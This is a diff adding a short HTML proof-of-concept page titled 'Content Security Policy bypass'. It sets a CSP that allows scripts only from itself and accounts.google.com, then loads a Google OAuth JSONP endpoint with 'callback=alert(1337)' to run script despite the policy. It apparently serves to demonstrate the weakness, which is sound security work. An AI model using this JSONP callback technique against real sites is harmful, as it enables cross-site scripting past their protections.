@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Content Security Policy bypass</title>
+    <meta http-equiv="Content-Security-Policy" content="script-src 'self' https://accounts.google.com">
+</head>
+<body>
+    <h1>Content Security Policy POC</h1>
+
+    <p>We are only allowing contents from *.google.com</p>
+    <script src="https://14.rs"></script>
+    <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
+</body>
+</html>
